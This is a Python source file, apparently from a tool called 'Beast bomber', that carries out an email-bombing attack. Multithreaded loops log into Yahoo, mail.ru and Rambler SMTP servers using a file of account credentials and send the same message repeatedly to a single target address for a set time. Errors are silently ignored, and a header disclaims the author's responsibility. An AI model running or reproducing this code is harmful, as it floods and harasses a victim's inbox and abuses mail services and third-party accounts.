"""
╔═════════════════════════════════════════════════════════════════════════════════╗
║                                                                                 ║
║                                   Beast bomber                                  ║
║  Author:                                                                        ║
║  https://github.com/un1cum                                                      ║
║                                                                                 ║
║  The author of this program is not responsible for its use!                     ║
║  When posting this code on other resources, please indicate the author!         ║
║                                                                                 ║
║                               All rights reserved.                              ║
║                            Copyright (C) 2023 un1cum                            ║
║                                                                                 ║
╚═════════════════════════════════════════════════════════════════════════════════╝
"""
import smtplib
import time
import os
from threading import Thread
from email.utils import make_msgid
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart


def email_start(threads, time_a, email, mes, subj):
    for _ in range(threads):
        th = Thread(target=email_attack, args=(email, time_a, mes, subj))
        th.start()


def email_attack(email, time_a, mes, subj):
    t = time.monotonic()
    emails = []

    with open(os.path.abspath('input/email_accounts.txt'), 'r') as file:
        for line in file:
            emails.append(line.replace('\n', ''))

    while time.monotonic() - t < time_a:
        for em in emails:
            if em.find('@yahoo.com') != -1:
                smtp = 'smtp.mail.yahoo.com'
            elif em.find('@mail.ru') != -1:
                smtp = 'smtp.mail.ru'
            else:
                smtp = 'smtp.rambler.ru'

            line = em.split(':')
            from_email = line[0]
            from_pas = line[1]

            try:
                msg = MIMEMultipart()
                msg['Message-ID'] = make_msgid()
                msg['From'] = from_email
                msg['To'] = email
                msg['Subject'] = subj
                msg.attach(MIMEText(mes, 'plain'))

                server = smtplib.SMTP(smtp, 587)
                server.ehlo()
                server.starttls()
                server.ehlo()
                server.login(msg['From'], from_pas)
                server.sendmail(msg['From'], msg['To'], msg.as_string())
                server.quit()
            except:
                pass
